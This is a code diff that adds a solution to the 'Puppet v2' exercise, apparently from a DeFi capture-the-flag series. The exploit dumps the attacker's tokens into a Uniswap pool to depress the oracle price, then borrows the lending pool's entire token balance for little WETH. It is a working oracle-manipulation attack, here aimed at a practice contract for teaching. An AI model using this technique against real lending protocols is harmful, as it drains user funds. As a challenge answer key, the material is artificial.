@@ -81,7 +81,24 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        let price = await this.lendingPool.connect(attacker).calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log(`## CURRENT PRICE TO BORROW ALL POOL TOKENS: ${ethers.utils.formatEther(price)} WETH`);
+        
+        let deadline = (await ethers.provider.getBlock('latest')).timestamp  + 100;
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(ATTACKER_INITIAL_TOKEN_BALANCE, ethers.utils.parseEther("1"), [this.token.address, this.uniswapRouter.WETH()], attacker.address, deadline);
+        console.log("## SWAPPED THE ATTACKER DVT TOKENS FOR ETH");
+
+        let newPrice = await this.lendingPool.connect(attacker).calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        let attackerBalance = await ethers.provider.getBalance(attacker.address);
+        console.log(`## NOW THE PRICE TO BORROW ALL POOL TOKENS IS: ${ethers.utils.formatEther(newPrice)} WETH. WE HAVE ${ethers.utils.formatEther(attackerBalance)} ETH`);
+
+        await this.weth.connect(attacker).deposit({ value: newPrice });
+        console.log("## CONVERTED THE ATTACKER ETH BALANCE TO WETH");
+
+        await this.weth.connect(attacker).approve(this.lendingPool.address, newPrice);
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("## BORROWED ALL THE POOL TOKENS");
     });
 
     after(async function () {
